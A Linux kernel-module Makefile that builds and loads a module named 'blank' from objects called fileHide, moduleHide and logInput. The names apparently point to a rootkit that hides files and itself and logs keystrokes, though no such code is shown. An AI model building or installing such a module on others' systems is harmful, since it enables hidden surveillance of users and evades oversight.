# Makefile with support for multiple files for kernel modules based on:
# http://www.paguilar.org/blog/?p=7

# Make sure you run with sudo if you install/uninstall!

# If it complains about the module not existing when you run install, don't worry - it's just
# trying to uninstall any previously running instances for you, and will install it for you anyway

PWD = $(shell pwd)
moduleName = blank
obj-m += $(moduleName).o
blank-objs += main.o fileHide.o moduleHide.o outputDevice.o logInput.o 

all:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean
	
install: all uninstallSilently
	insmod ./$(moduleName).ko

uninstall:
	-rmmod $(moduleName)
	
uninstallSilently:
	-@rmmod $(moduleName)
